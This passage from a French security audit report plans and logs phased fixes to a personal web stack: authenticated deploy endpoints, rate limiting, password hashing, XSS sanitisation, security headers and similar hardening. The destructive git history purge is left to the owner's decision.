- **Décider** : autorise-t-on la purge de l'historique git pour `casino.db`
  (réécriture d'historique + force-push — destructif) ?

### Phase 1 — Critiques : couper l'accès non authentifié & stopper la fuite
Couvre **C1, C2, C3, H1**.
- Dé-suivre `casino.db`, durcir `.gitignore`, invalider sessions/invitations.
- Authentifier tous les `/api/deploy/*` mutants ; `_require_same_origin`
  *fail-closed*.
- *Questions à trancher* : que devient le bouton « Réparer & redémarrer » de la
  page 404 ? (a) le supprimer, (b) le garder derrière login, (c) le garder avec
  un jeton secret. Compromis disponibilité ↔ sécurité.

### Phase 2 — Authentification & secrets
Couvre **H2, H5, M4**.
- Anti-brute-force (rate-limit + lockout/backoff), refus du mot de passe défaut
  côté backend, hachage du mot de passe Portfolio.
- *Questions* : `flask-limiter` (dépendance) ou limitation maison en mémoire ?
  Verrouillage par IP, par compte, ou backoff ? Forçage du changement de mot de
  passe : bloquant ou bandeau ?

### Phase 3 — XSS, CMS, upload, en-têtes
Couvre **H3, H4, M1, M2, M3**.
- Sanitisation du contenu CMS, durcissement de l'upload, en-têtes de sécurité +
  CSP, cookies durcis, CSRF uniforme.
- *Questions* : CMS — autoriser un sous-ensemble de HTML (gras, sauts de ligne)
  ou tout en texte brut ? SVG — interdiction totale ou service en `attachment` ?
  CSP — stricte d'emblée (risque de casser polices Google / iframes) ou
  permissive au départ ?

### Phase 4 — Durcissement
Couvre **M5, M6, M7, M8, M9, M10, M11, M12, L1–L5**.
- *Questions* : le cashout Casino — validation serveur (lourd) ou
  plafonnement/audit (léger) ? Nombre de threads Waitress cible ? Garde-t-on le
  hook auto-push, et sous quelle forme ?

### Phase 5 — Défense en profondeur (nécessite ton action)
- Signature GPG des commits + vérification côté serveur avant `pull` (C3).
- Protection de branche `main` sur GitHub (revue obligatoire).
- Cloudflare Access devant `/admin` et `/api/deploy/*`.
- Chiffrement des sauvegardes.

---

## 10. Actions à mener par Antoine

Synthèse de ce qui **ne peut pas** être fait par du code et requiert ton
intervention :

| # | Action | Pourquoi | Quand |
|---|--------|----------|-------|
| 1 | Confirmer si le dépôt GitHub est public ou privé | Détermine la gravité réelle de C1 | Avant Phase 1 |
| 2 | Changer les 3 mots de passe admin (≠ `admin`) | H2 — défaut trivial | Maintenant |
| 3 | Valider (ou non) la purge d'historique git de `casino.db` | C1 — action destructive, force-push | Avant Phase 1 |
| 4 | Mettre une protection de branche sur `main` (GitHub) | C3 — empêcher le push direct | Phase 5 |
| 5 | Mettre en place la signature GPG des commits | C3 — vérifier l'intégrité du code tiré | Phase 5 |
| 6 | (Optionnel) Activer Cloudflare Access devant `/admin` | Défense en profondeur | Phase 5 |
| 7 | Chiffrer les sauvegardes si tu en fais (`gpg`/`age`) | Chiffrement au repos *utile* | Quand pertinent |

---

---

## 11. Journal des corrections

### Phase 1 — Failles critiques (version `0.4.6`)

Branche `claude/security-audit-fixes-YfYfc` · couvre **C1, C2, C3, H1**.

- **C1** — `Casino/casino.db` retirée du suivi git (`git rm --cached`) ;
  `.gitignore` durci (`*.db`, `*.sqlite*`, fichiers annexes `-wal`/`-journal`/`-shm`).
  Ajout de `casino_db.purge_compromised_credentials()` : au premier redémarrage
  après déploiement, **toutes les sessions Casino et les invitations non
  consommées sont révoquées** (idempotent, repéré par un flag en base). La purge
  de l'historique git a été **déclinée** par le propriétaire : les jetons étant
  déjà neutralisés par la rotation, le risque résiduel (IPs / pseudos encore
  visibles dans l'historique public) est accepté.
- **C2** — `/api/deploy/pull-from-404` et `/api/deploy/rollback` exigent
  désormais une session admin (réponse `401` sinon). `_require_same_origin()`
  rendu *fail-closed* (refus si ni `Origin` ni `Referer`). Les boutons des pages
  404/500 redirigent vers `/login` si l'utilisateur n'est pas connecté.
- **C3** — le déclenchement de la chaîne de mise à jour est maintenant
  authentifié (conséquence directe de C2). La vérification de signature des
  commits (GPG) reste planifiée en Phase 5.
- **H1** — `/api/deploy/restart-internal` : le contrôle d'IP (inopérant derrière
  le tunnel) est remplacé par un **jeton secret partagé** (`RESTART_TOKEN`,
  généré dans `.portfolio_config.json`, transmis via l'en-tête
  `X-Restart-Token`).

### Phase 2 — Authentification & secrets (version `0.4.7`)

Couvre **H2, H5, M4**.

- **H2** — rate-limiter maison en mémoire (`ratelimit.py`) appliqué aux 4 points
  d'entrée d'authentification (login Portfolio, admin-login & redeem Casino,
  login SiteEntreprise) : 8 échecs en 5 min → blocage 15 min, réponse `429`. Les
  `time.sleep` du Casino (qui monopolisaient un thread Waitress) sont supprimés.
  Mot de passe par défaut « admin » du Portfolio : tant qu'il est actif, toute
  opération de déploiement est bloquée côté serveur (`before_request`) — seul le
  changement de mot de passe reste permis, signalé par un bandeau d'alerte.
- **H5** — le mot de passe admin Portfolio est désormais **haché** (werkzeug) ;
  plus aucun mot de passe en clair sur disque. Migration automatique d'un
  éventuel ancien `admin_pass` en clair dans `.portfolio_config.json`.
- **M4** — `/api/deploy/change-password` exige le mot de passe actuel, impose un
  minimum de 8 caractères, refuse « admin » et la réutilisation du mot de passe
  courant, et applique le contrôle same-origin. Longueurs minimales alignées à
  8 caractères sur les trois entités.

### Phase 3 — XSS, CMS, upload, en-têtes (version `0.4.8`)

Couvre **H3, H4, M1, M2, M3**.

- **H3** — XSS stocké du CMS neutralisé côté client : tout le HTML rendu par
  `Editable.jsx` (lecture, édition, sauvegarde) passe désormais par DOMPurify ;
  les URL des liens et images éditables sont validées (schéma `javascript:`
  rejeté). Bundle React reconstruit.
- **H4** — les fichiers uploadés (SVG compris) sont servis avec
  `Content-Disposition: attachment`, une CSP `default-src 'none'; sandbox` et
  `X-Content-Type-Options: nosniff` : un SVG malveillant ne peut plus exécuter
  de script.
- **M1** — en-têtes de sécurité ajoutés à toutes les réponses : **CSP stricte**
  (`script-src 'self'` — tous les scripts inline sortis dans des fichiers
  `static/*.js`, plus aucun `onclick` inline), `X-Content-Type-Options`,
  `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`, `Permissions-Policy`, et
  `Strict-Transport-Security` (réponses HTTPS). Absence de violation CSP
  vérifiée en navigateur (Chromium) sur les 6 types de pages.
- **M2** — cookie de session Portfolio : `HttpOnly` + `SameSite=Lax` + `Secure`
  en production.
- **M3** — contrôle same-origin étendu à `change-password`, `restart` et
  `launch-prospup`.

### Déploiement des Phases 1–3 (21 mai 2026)

- Phases 1–3 (PR #37, PR #38, version `0.4.8`) déployées sur le serveur ;
  base Casino repartie **vierge** (choix du propriétaire) — rotation C1
  vérifiée, bandeau « mot de passe par défaut » et blocage serveur des
  opérations de déploiement vérifiés (`403`).
- Un `admin_pass_hash` au format incompatible (écrit par le code d'une branche
  tierce) bloquait le login admin (`HTTP 500`) : retiré de
  `.portfolio_config.json`, le serveur retombe sur le défaut le temps du
  changement de mot de passe.
- L'outil de restart local — slash command `/restart` — a été basculé de
  `/api/deploy/restart` (session + mot de passe en dur) vers
  `/api/deploy/restart-internal` + en-tête `X-Restart-Token` : fonctionne
  quel que soit l'état du mot de passe admin.

### Phase 4 — Durcissement (version `0.4.9`)

Couvre **M5–M12** et **L1–L5**.

- **M5** — `/casino/api/chips/cashout` : plafond glissant des crédits positifs
  (1 000 000 jetons / 5 min par joueur) + limite de fréquence (60 appels / min)
  + journalisation des dépassements. Niveau « léger » retenu (jetons = monnaie
  fictive) : pas d'état de jeu autoritaire côté serveur.
- **M6** — `/casino/api/room/create` : limite de fréquence par IP (10 rooms /
  5 min) + plafond global de rooms en mémoire (60) + journalisation. Niveau
  « léger » : pas d'authentification des joueurs ni de liaison room ↔ session.
- **M7** — pool de threads Waitress porté de 8 à 32 ; plafond de flux SSE
  concurrents par IP (6) sur `/casino/api/room/<code>/stream`, via une jauge
  `acquire`/`release` ajoutée à `ratelimit.py`.
- **M8** — le serveur écoute sur `127.0.0.1` (et non plus `0.0.0.0`), en prod
  comme en dev : l'accès direct depuis le LAN, qui contournait le tunnel
  Cloudflare, est coupé. Confirmé avec le propriétaire (aucun usage LAN).
- **M9** — conséquence de M8 : le debugger interactif Werkzeug du mode dev
  n'est plus joignable que depuis la loopback.
- **M10** — `requirements.txt` : versions exactes figées (`flask==3.1.3`,
  `waitress==3.0.2`, `werkzeug==3.1.8`).
- **M11** — `.gitignore` complété (`.claude/worktrees/`). Le hook auto-push
  passe de `git add -A` (cause racine de la fuite C1) à `git add -u` — fichiers
  déjà suivis uniquement, plus aucun ajout aveugle de fichier nouveau.
- **M12** — open redirect sur `/login?next=` corrigé : seuls les chemins
  relatifs internes sont acceptés (rejet des URL absolues, `//`, des schémas et
  des antislashs). Vérifié par test.
- **L1** — `GET /api/deploy/health` exige désormais une session admin.
- **L2** — `api_invite_info` ne divulgue plus `is_admin` avant redemption.
- **L3** — l'IP client du Casino est dérivée de `CF-Connecting-IP` (posée par
  Cloudflare, non falsifiable) plutôt que du `X-Forwarded-For` brut.
- **L4** — `boot_portfolio.ps1` dérive son chemin de `$PSScriptRoot` — plus de
  chemin absolu ni de nom d'utilisateur codés en dur.
- **L5** — les endpoints de déploiement ne renvoient plus la sortie d'erreur
  git brute : détail journalisé côté serveur, message générique au client.

*Phase 5 : non démarrée. Les questions de choix architecturaux sont posées
avant chaque phase.*

---

*Fin du rapport.*
